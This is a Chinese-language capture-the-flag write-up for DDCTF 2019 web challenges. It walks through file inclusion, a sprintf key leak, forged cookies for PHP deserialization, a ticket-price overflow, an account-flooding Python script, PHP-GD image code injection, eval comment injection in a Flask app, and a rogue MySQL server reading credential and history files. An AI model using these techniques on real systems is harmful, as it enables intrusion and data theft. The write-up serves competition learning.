---
title: ddctf_writeup
date: 2019-04-24 21:41:19
tags: writeup
---


# DDCTF2019

## web

### 滴~

题目url <http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09>

感觉像是包含，先解码一下参数，然后发现是两次base，变成了hex编码，再decode就发现是flag.jpg，所以可以尝试包含index.php，转换之后的值是TmprMlJUWTBOalUzT0RKRk56QTJPRGN3,提交可获得index.php源码，然后发现读出来的数据在图片源中，提取解码得到

```php
<?php
/*
 * https://blog.csdn.net/FengBanLiuYun/article/details/80616607
 * Date: July 4,2018
 */
error_reporting(E_ALL || ~E_NOTICE);


header('content-type:text/html;charset=utf-8');
if(! isset($_GET['jpg']))
    header('Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09');
$file = hex2bin(base64_decode(base64_decode($_GET['jpg'])));
echo '<title>'.$_GET['jpg'].'</title>';
$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);
echo $file.'</br>';
$file = str_replace("config","!", $file);
echo $file.'</br>';
$txt = base64_encode(file_get_contents($file));

echo "<img src='data:image/gif;base64,".$txt."'></img>";
/*
 * Can you find the flag file?
 *
 */

?>
```

然后根据去访问csdn博客，发现一片swp的文章，然后尝试之后发现没有config.php等文件的swp，然后再去博客中看到.practice.txt.swp，尝试一下不行，把点去掉，得到提示在f1ag!ddctf.php,然后根据前面的index.php中config会被替换成_,将f1agconfigddctf.php编码提交，得到源码

```php
<?php
include('config.php');
$k = 'hello';
extract($_GET);
if(isset($uid))
{
    $content=trim(file_get_contents($k));
    if($uid==$content)
	{
		echo $flag;
	}
	else
	{
		echo'hello';
	}
}

?>
```

提交uid=&content=即可得到flag



## WEB 签到题

访问提示："抱歉，您没有登陆权限，请获取权限后访问-----"

查看HTTP头，发现设置了一个didictf_username，且为空，试了下root admin，发现是admin，然后改头提交，提示："您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php"

访问之后得到源码：

```php

// url:app/Application.php

Class Application {
    var $path = '';


    public function response($data, $errMsg = 'success') {
        $ret = ['errMsg' => $errMsg,
            'data' => $data];
        $ret = json_encode($ret);
        header('Content-type: application/json');
        echo $ret;

    }

    public function auth() {
        $DIDICTF_ADMIN = 'admin';
        if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) && $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) {
            $this->response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php');
            return TRUE;
        }else{
            $this->response('抱歉，您没有登陆权限，请获取权限后访问-----','error');
            exit();
        }

    }
    private function sanitizepath($path) {
    $path = trim($path);
    $path=str_replace('../','',$path);
    $path=str_replace('..\\','',$path);
    return $path;
}

public function __destruct() {
    if(empty($this->path)) {
        exit();
    }else{
        $path = $this->sanitizepath($this->path);
        if(strlen($path) !== 18) {
            exit();
        }
        $this->response($data=file_get_contents($path),'Congratulations');
    }
    exit();
}
}

```

```php




// url:app/Session.php



include 'Application.php';
class Session extends Application {

    //key建议为8位字符串
    var $eancrykey                  = '';
    var $cookie_expiration			= 7200;
    var $cookie_name                = 'ddctf_id';
    var $cookie_path				= '';
    var $cookie_domain				= '';
    var $cookie_secure				= FALSE;
    var $activity                   = "DiDiCTF";


    public function index()
    {
	if(parent::auth()) {
            $this->get_key();
            if($this->session_read()) {
                $data = 'DiDI Welcome you %s';
                $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']);
                parent::response($data,'sucess');
            }else{
                $this->session_create();
                $data = 'DiDI Welcome you';
                parent::response($data,'sucess');
            }
        }

    }

    private function get_key() {
        //eancrykey  and flag under the folder
        $this->eancrykey =  file_get_contents('../config/key.txt');
    }

    public function session_read() {
        if(empty($_COOKIE)) {
        return FALSE;
        }

        $session = $_COOKIE[$this->cookie_name];
        if(!isset($session)) {
            parent::response("session not found",'error');
            return FALSE;
        }
        $hash = substr($session,strlen($session)-32);
        $session = substr($session,0,strlen($session)-32);

        if($hash !== md5($this->eancrykey.$session)) {
            parent::response("the cookie data not match",'error');
            return FALSE;
        }
        $session = unserialize($session);


        if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){
            return FALSE;
        }

        if(!empty($_POST["nickname"])) {
            $arr = array($_POST["nickname"],$this->eancrykey);
            $data = "Welcome my friend %s";
            foreach ($arr as $k => $v) {
                $data = sprintf($data,$v);
            }
            parent::response($data,"Welcome");
        }

        if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) {
            parent::response('the ip addree not match'.'error');
            return FALSE;
        }
        if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) {
            parent::response('the user agent not match','error');
            return FALSE;
        }
        return TRUE;

    }

    private function session_create() {
        $sessionid = '';
        while(strlen($sessionid) < 32) {
            $sessionid .= mt_rand(0,mt_getrandmax());
        }

        $userdata = array(
            'session_id' => md5(uniqid($sessionid,TRUE)),
            'ip_address' => $_SERVER['REMOTE_ADDR'],
            'user_agent' => $_SERVER['HTTP_USER_AGENT'],
            'user_data' => '',
        );

        $cookiedata = serialize($userdata);
        $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata);
        $expire = $this->cookie_expiration + time();
        setcookie(
            $this->cookie_name,
            $cookiedata,
            $expire,
            $this->cookie_path,
            $this->cookie_domain,
            $this->cookie_secure
            );

    }
}


$ddctf = new Session();
$ddctf->index();

```



进行源码审计：

有几个点：

```
1. 获取salt
	private function get_key() {
        //eancrykey  and flag under the folder
        $this->eancrykey =  file_get_contents('../config/key.txt');
   	｝
2. 设置cookie
	$cookiedata = serialize($userdata);
	$cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata);
	这里的$this->eancrykey就是上面获取的
3.每次验证cookie
	    $hash = substr($session,strlen($session)-32);
        $session = substr($session,0,strlen($session)-32);
        if($hash !== md5($this->eancrykey.$session)) {
            parent::response("the cookie data not match",'error');
            return FALSE;
        }
        // 反序列化data
        $session = unserialize($session);
4. 魔方函数
    private function sanitizepath($path) {
        $path = trim($path);
        $path=str_replace('../','',$path);
        $path=str_replace('..\\','',$path);
        return $path;
    }

    public function __destruct() {

        if(empty($this->path)) {
            exit();
        }else{
            $path = $this->sanitizepath($this->path);
            if(strlen($path) !== 18) {
                exit();
            }
            $this->response($data=file_get_contents($path),'Congratulations');
        }
        exit();
    }
结合上面的点可以知道，如果知道key.txt的内容，cookie就可以让自己伪造data，然后反序列化Session或者Application对象触发__destruct从而读取文件

5.获取key.txt
        if(!empty($_POST["nickname"])) {
            $arr = array($_POST["nickname"],$this->eancrykey);
            $data = "Welcome my friend %s";
            foreach ($arr as $k => $v) {
                $data = sprintf($data,$v);
            }
            parent::response($data,"Welcome");
        }
这里考察的是sprintf的函数，如果nickname是字符串，那么只会格式化第一次，第二次轮不到eancrykey，所以查询下sprintf函数
sprintf ( string $format [, mixed $... ] ) : string
Returns a string produced according to the formatting string format.
The format string is composed of zero or more directives: ordinary characters (excluding %) that are copied directly to the result and conversion specifications, each of which results in fetching its own parameter.
意思就是第一个format是格式的意思，那凭直觉试nickname=%s,就可以打印出key.txt：EzblrbNS
```

接下来就是构造反序列化的参数了，将上面的Application.php代码放到本地，然后在下面添加

```php
$ddctf1 = new Application();

$ddctf1->path = '...\./config/flag.txt';

$a = serialize($ddctf1);
echo $a;
```

得到反序列字符串，再与EzblrbNS拼接，再得到它的md5值，然后将反序列字符串与md5值拼接，得到cookie,再urlencode，提交得到flag

![](https://qqx.im/mdimage/ddctf2019/key.png)



## 大吉大利 今晚吃鸡

题目提示：注册用户登陆系统并购买入场票据,淘汰所有对手就能吃鸡啦~

进入题目，是个登录框，有注册按钮，按照题目提示，注册然后登录

![](https://qqx.im/mdimage/ddctf2019/chiji.png)

点击购买，购买门票之后在订单列表中，有个价格2k的门票要支付，但是我只有100块钱啊！抓包看了下，价格是可以自己修改的。所以想了下，思路往竞争方向想，但是又没有卖的，所以又往溢出的方向想，试了一下各种溢出的上限，发现是unsigned long,上限4294967295。所以 提交http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296，就可以0元购买了。然后进入杀鸡界面

![](https://qqx.im/mdimage/ddctf2019/ticket.png)

试了试去，就想出个注册小号给大号杀，

脚本：

这里有个坑就是，服务器网络不稳定，然后注册的id会随机，所以，要跑很久。

```python
import requests
import queue
import json
import time



base_url = 'http://117.51.147.155:5050/'
register_url = 'ctf/api/register?name={0}&password={1}'
login_url = 'ctf/api/login?name={}&password={}'
buy_url = 'ctf/api/buy_ticket?ticket_price=4294967296'
get_bill_info_url = 'ctf/api/search_bill_info'
pay_url = 'ctf/api/pay_ticket?bill_id={}'
# game main get the id and the ticket
ticket_url = 'ctf/api/search_ticket'
# remove url
remove_url = 'ctf/api/remove_robot?id={}&ticket={}'
password = '12345678'

# message queue
q = queue.Queue()

headers = {'Accept': 'text/html, application/xhtml+xml, image/jxr, */*',
               'Accept - Encoding':'gzip, deflate',
               'Accept-Language':'zh-Hans-CN, zh-Hans; q=0.5',
               'Connection':'Keep-Alive',
               'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063'
           }

def fuck_ticket(name):
    time.sleep(2)
    s = requests.Session()
    url = base_url + register_url
    name = 'wulasitea' + str(name)
    # 注册
    url = url.format(name, password)
    s.get(url)
    print(name)
    # 登录
    url = base_url + login_url
    url = url.format(name, password)
    # print(s.get(url).text + name)
    s.get(url)
    # 购票
    url = base_url + buy_url
    res = s.get(url)

    # bill_id
    url = base_url + get_bill_info_url
    try:
        bill_id = json.loads(s.get(url).text)['data'][0]['bill_id']
        # 支付
        url = base_url + pay_url
        url = url.format(bill_id)
        s.get(url)
        # print(s.get(url).text)
    except ValueError as e:
        pass
    except IndexError as e:
        pass
    # get the final data

    try:
        url = base_url + ticket_url
        content = json.loads(s.get(url).text)
        id = str(content['data'][0]['id'])
        ticket_id = content['data'][0]['ticket']
        #删除
        name = 'h'
        url = base_url + login_url
        url = url.format(name, password)
        s.get(url)
        url = base_url + remove_url
        url = url.format(id, ticket_id)
        print(url)
        print(s.get(url, headers=headers).text)
        with open('C:/Users/97125/Desktop/1.txt', 'a') as f:
            f.write(id + ',' + ticket_id +'\n')
    except IndexError as e:
        print('error' + name)
    except json.decoder.JSONDecodeError as e:
        print('error' + name)

def cosumer_ticket():
    # 登录
    s = requests.Session()
    name = 'h'
    url = base_url + login_url
    url = url.format(name, password)
    print(url)
    res1 = s.get(url)

    # tick_list = q.get()
    with open('C:/Users/97125/Desktop/1.txt', 'r') as f:
        for i in f.readlines():
            res = i.split(',')
            url = base_url + remove_url
            url = url.format(res[0], res[1])
            print(url)
            print(s.get(url).text)

def main():
    for i in range(300,500):
        fuck_ticket(i)
    cosumer_ticket()

if __name__ == '__main__':
    main()

```

最后跑满100个不重复的id就可以吃鸡了

## uploadimg（未做出）

​    这题当时是无从下手，也没想到要把上传上去的图片下下来看。看了大家的writeup和解析之后，自己动手慢慢fuzz了两天晚上，终于知道是什么意思了。

​	一开始就是一个简单的上传图片的界面，上传之后提示

![](https://qqx.im/mdimage/ddctf2019/upload1.jpg)

在尝试通过burp增加phpinfo()之后无果。(假装我当时做出来了）正常思路应该是把上传的图片下下来，然后查看hex，对比发现不一样了，然后文件头有gd-jpeg字样。

查看hex

![](https://qqx.im/mdimage/ddctf2019/upload2.jpg)

搜索一下，发现这是一个PHP的一个GD库，渲染图片用的。然后我再一搜，php GD漏洞，搜到

[freebuf的文章](https://www.freebuf.com/articles/web/54086.html)

> **对比两张经过php-gd库转换过的gif图片，如果其中存在相同之处，这就证明这部分图片数据不会经过转换。然后我可以注入代码到这部分图片文件中，最终实现远程代码执行**

原理解释在[github](<https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromjpeg/blob/master/README.md>)上有。主要是

![](https://qqx.im/mdimage/ddctf2019/upload3.jpg)

在Scan header**正后方**修改，后面添加的内容就不会被修改了，注意一定是正后方，并且是已经转换过的一次。

然后在burpsuite我发现在

![](https://qqx.im/mdimage/ddctf2019/upload4.jpg)

**第二个wxzy**后面的**问号**的后面的空格的后面，比较绕，看图。直接添加，得到flag。

这题主要就是考察一个GD库渲染的漏洞，通常还是要结合实际，比如上传检测的时候文件头，然后又会做GD渲染。



##  homebrew event loop

这道题看了一天，还是没做出来，实属dd,看的自闭。

这题切入其实是一个python eval # 截断，大概类似于注释？，然后就可以突破去调用trigger_event函数，再将购买五个和show_flag插入调用队列中，不让consume_point有机可乘。

下面就来讲解这串代码

```python
# -*- encoding: utf-8 -*-
# written in python 2.7
__author__ = 'garzon'

from flask import Flask, session, request, Response
import urllib

app = Flask(__name__)
app.secret_key = '*********************'  # censored
url_prefix = '/d5af33f66147e857'


def FLAG():
    return 'FLAG_is_here_but_i_wont_show_you'  # censored


def trigger_event(event):
    session['log'].append(event)
    if len(session['log']) > 5: session['log'] = session['log'][-5:]
    if type(event) == type([]):
        request.event_queue += event
    else:
        request.event_queue.append(event)


def get_mid_str(haystack, prefix, postfix=None):
    haystack = haystack[haystack.find(prefix) + len(prefix):]
    if postfix is not None:
        haystack = haystack[:haystack.find(postfix)]
    return haystack


class RollBackException: pass


def execute_event_loop():
    valid_event_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#')
    resp = None
    while len(request.event_queue) > 0:
        event = request.event_queue[0]  # `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"
        request.event_queue = request.event_queue[1:]
        if not event.startswith(('action:', 'func:')): continue
        for c in event:
            if c not in valid_event_chars: break
        else:
            is_action = event[0] == 'a'
            action = get_mid_str(event, ':', ';')
            args = get_mid_str(event, action + ';').split('#')
            try:
                action1 = action + ('_handler' if is_action else '_function')
                event_handler = eval(action1)
                ret_val = event_handler(args)
            except RollBackException:
                if resp is None: resp = ''
                resp += 'ERROR! All transactions have been cancelled. <br />'
                resp += '<a href="./?action:view;index">Go back to index.html</a><br />'
                session['num_items'] = request.prev_session['num_items']
                session['points'] = request.prev_session['points']
                break
            except Exception, e:
                if resp is None: resp = ''
                # resp += str(e) # only for debugging
                continue
            if ret_val is not None:
                if resp is None:
                    resp = ret_val
                else:
                    resp += ret_val
    if resp is None or resp == '': resp = ('404 NOT FOUND', 404)
    session.modified = True
    return resp


@app.route(url_prefix + '/')
def entry_point():
    querystring = urllib.unquote(request.query_string)
    request.event_queue = []
    if querystring == '' or (not querystring.startswith('action:')) or len(querystring) > 100:
        querystring = 'action:index;False#False'
    if 'num_items' not in session:
        session['num_items'] = 0
        session['points'] = 3
        session['log'] = []
    request.prev_session = dict(session)
    trigger_event(querystring)
    return execute_event_loop()


# handlers/functions below --------------------------------------

def view_handler(args):
    page = args[0]
    html = ''
    html += '[INFO] you have {} diamonds, {} points now.<br />'.format(session['num_items'], session['points'])
    if page == 'index':
        html += '<a href="./?action:index;True%23False">View source code</a><br />'
        html += '<a href="./?action:view;shop">Go to e-shop</a><br />'
        html += '<a href="./?action:view;reset">Reset</a><br />'
    elif page == 'shop':
        html += '<a href="./?action:buy;1">Buy a diamond (1 point)</a><br />'
    elif page == 'reset':
        del session['num_items']
        html += 'Session reset.<br />'
    html += '<a href="./?action:view;index">Go back to index.html</a><br />'
    return html


def index_handler(args):
    bool_show_source = str(args[0])
    bool_download_source = str(args[1])
    if bool_show_source == 'True':

        source = open('eventLoop.py', 'r')
        html = ''
        if bool_download_source != 'True':
            html += '<a href="./?action:index;True%23True">Download this .py file</a><br />'
            html += '<a href="./?action:view;index">Go back to index.html</a><br />'

        for line in source:
            if bool_download_source != 'True':
                html += line.replace('&', '&amp;').replace('\t', '&nbsp;' * 4).replace(' ', '&nbsp;').replace('<',
                                                                                                              '&lt;').replace(
                    '>', '&gt;').replace('\n', '<br />')
            else:
                html += line
        source.close()

        if bool_download_source == 'True':
            headers = {}
            headers['Content-Type'] = 'text/plain'
            headers['Content-Disposition'] = 'attachment; filename=serve.py'
            return Response(html, headers=headers)
        else:
            return html
    else:
        trigger_event('action:view;index')


def buy_handler(args):
    num_items = int(args[0])
    if num_items <= 0: return 'invalid number({}) of diamonds to buy<br />'.format(args[0])
    session['num_items'] += num_items
    trigger_event(['func:consume_point;{}'.format(num_items), 'action:view;index'])


def consume_point_function(args):
    point_to_consume = int(args[0])
    if session['points'] < point_to_consume: raise RollBackException()
    session['points'] -= point_to_consume


def show_flag_function(args):
    flag = args[0]
    # return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.
    return 'You naughty boy! ;) <br />'


def get_flag_handler(args):
    if session['num_items'] >= 5:
        trigger_event('func:show_flag;' + FLAG())  # show_flag_function has been disabled, no worries
    trigger_event('action:view;index')


if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5001)

```

首先这是一个flask框架写的，入口在entry_point，它主要做的事是初始化然后调用trigger_event将提交的参数入队到event_queue，然后调用execute_event_loop去消费event_queue里的东西。现在重点来看下execute_event_loop

```python
def execute_event_loop():
    // 白名单
    valid_event_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#')
    resp = None
    while len(request.event_queue) > 0:
        // 出队
        event = request.event_queue[0]  # `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"
        request.event_queue = request.event_queue[1:]
        // 如果不是以action fun开头，则跳过循环
        if not event.startswith(('action:', 'func:')): continue
        // 白名单检测
        for c in event:
            if c not in valid_event_chars: break
        else:
            // a开头就是action，其它就是function
            is_action = event[0] == 'a'
            // 分割出action
            action = get_mid_str(event, ':', ';')
            // 分割出参数
            args = get_mid_str(event, action + ';').split('#')
            try:
                // 执行函数
                action1 = action + ('_handler' if is_action else '_function')
                event_handler = eval(action1)
                ret_val = event_handler(args)
            except RollBackException:
                if resp is None: resp = ''
                resp += 'ERROR! All transactions have been cancelled. <br />'
                resp += '<a href="./?action:view;index">Go back to index.html</a><br />'
                session['num_items'] = request.prev_session['num_items']
                session['points'] = request.prev_session['points']
                break
            except Exception, e:
                if resp is None: resp = ''
                # resp += str(e) # only for debugging
                continue
            if ret_val is not None:
                if resp is None:
                    resp = ret_val
                else:
                    resp += ret_val
    if resp is None or resp == '': resp = ('404 NOT FOUND', 404)
    session.modified = True
    return resp
```

看到这里，这个脚本本意是只让你能控制调用的\_handler和\_function。

接下来看要如何得到flag

```python
def get_flag_handler(args):
    if session['num_items'] >= 5:
        trigger_event('func:show_flag;' + FLAG())  # show_flag_function has been disabled, no worries
    trigger_event('action:view;index')
```

session['num_items'] >= 5

如何增加session['num_items'] 

```python
def buy_handler(args):
    num_items = int(args[0])
    if num_items <= 0: return 'invalid number({}) of diamonds to buy<br />'.format(args[0])
    session['num_items'] += num_items
    trigger_event(['func:consume_point;{}'.format(num_items), 'action:view;index'])


def consume_point_function(args):
    point_to_consume = int(args[0])
    if session['points'] < point_to_consume: raise RollBackException()
    session['points'] -= point_to_consume
```

buy_handler先是增加session['num_items'],但是随后又把消耗session['num_items']的函数入队列。而且python（好像）是没有溢出的。

当时就觉得是这里是入手点，buy和cousume分开了。先是想的竞争，后面想了下，是单线程的。

所以需要想个办法把这个女人，不对这两函数分开，中间插个get_flag_handler,这样就可以获得flag了。

payload

```
?action:trigger_event%23;action:buy;5%23action:get_flag;
```

看下会发生什么

![](https://qqx.im/mdimage/ddctf2019/event1.jpg)

首先看action1=trigger_event#_handler，eval之后其实后面就被截断、注释掉了，所以就可以调用trigger_event，将buy和get_flag先入队。最后flag就在session里，flask的session解密在[P师傅](<https://www.leavesongs.com/PENETRATION/client-session-security.html>)

![](https://qqx.im/mdimage/ddctf2019/event2.jpg)





## mysql弱口令（未做出）

这题流程还挺简单的，感觉比吃鸡还简单，就是一个知识点。

出题人的预期的流程大概就是部署agent.py->修改返回的数据->构造恶意的mysql server读取敏感文件

题目叫部署agent.py再进行扫描，那就部署到自己的服务器上,用的是python2

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 12/1/2019 2:58 PM
# @Author  : fz
# @Site    : 
# @File    : agent.py
# @Software: PyCharm

import json
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from optparse import OptionParser
from subprocess import Popen, PIPE


class RequestHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        request_path = self.path

        print("\n----- Request Start ----->\n")
        print("request_path :", request_path)
        print("self.headers :", self.headers)
        print("<----- Request End -----\n")

        self.send_response(200)
        self.send_header("Set-Cookie", "foo=bar")
        self.end_headers()

        result = self._func()
        self.wfile.write(json.dumps(result))


    def do_POST(self):
        request_path = self.path

        # print("\n----- Request Start ----->\n")
        print("request_path : %s", request_path)

        request_headers = self.headers
        content_length = request_headers.getheaders('content-length')
        length = int(content_length[0]) if content_length else 0

        # print("length :", length)

        print("request_headers : %s" % request_headers)
        print("content : %s" % self.rfile.read(length))
        # print("<----- Request End -----\n")

        self.send_response(200)
        self.send_header("Set-Cookie", "foo=bar")
        self.end_headers()
        result = self._func()
        self.wfile.write(json.dumps(result))

    def _func(self):
        netstat = Popen(['netstat', '-tlnp'], stdout=PIPE)
        netstat.wait()

        ps_list = netstat.stdout.readlines()
        result = []
        for item in ps_list[2:]:
            tmp = item.split()
            Local_Address = tmp[3]
            Process_name = tmp[6]
            tmp_dic = {'local_address': Local_Address, 'Process_name': Process_name}
            result.append(tmp_dic)
        return result

    do_PUT = do_POST
    do_DELETE = do_GET


def main():
    port = 8123
    print('Listening on localhost:%s' % port)
    server = HTTPServer(('0.0.0.0', port), RequestHandler)
    server.serve_forever()


if __name__ == "__main__":
    parser = OptionParser()
    parser.usage = (
        "Creates an http-server that will echo out any GET or POST parameters, and respond with dummy data\n"
        "Run:\n\n")
    (options, args) = parser.parse_args()

    main()
```

简单的看了一下就是返回netstat -tpnl的内容 主要是

```
'local_address': Local_Address, 'Process_name': Process_name
```

在题目界面输入IP和端口，如果你确实开了mysql服务，它就会提示未扫出弱密码，如果没有开启mysql或者未部署agent.py就会提示没有开启mysql。所以可以判断它是根据agent.py返回做扫描判断。fuzz了一下，发现是对Process_name判断，有没有mysqld。所以手动修改这行为

```
tmp_dic = {'local_address': Local_Address, 'Process_name': 'mysqld'}
```

然后再部署一个恶意的mysql服务器去读靶机的敏感文件，/etc/passwd ~/.mysql_history ~/.bashrc等，其实是在~/.mysql_history。

![](https://qqx.im/mdimage/ddctf2019/mysql.jpg)

参考：[原理](https://www.anquanke.com/post/id/106488)和[脚本](https://github.com/allyshka/Rogue-MySql-Server)

值得一提的是，这个点也在下一周的国赛中用到了，可惜的是当时没时间弄懂这次的，要不然国赛也可以得分，能稳进决赛在在边缘徘徊。
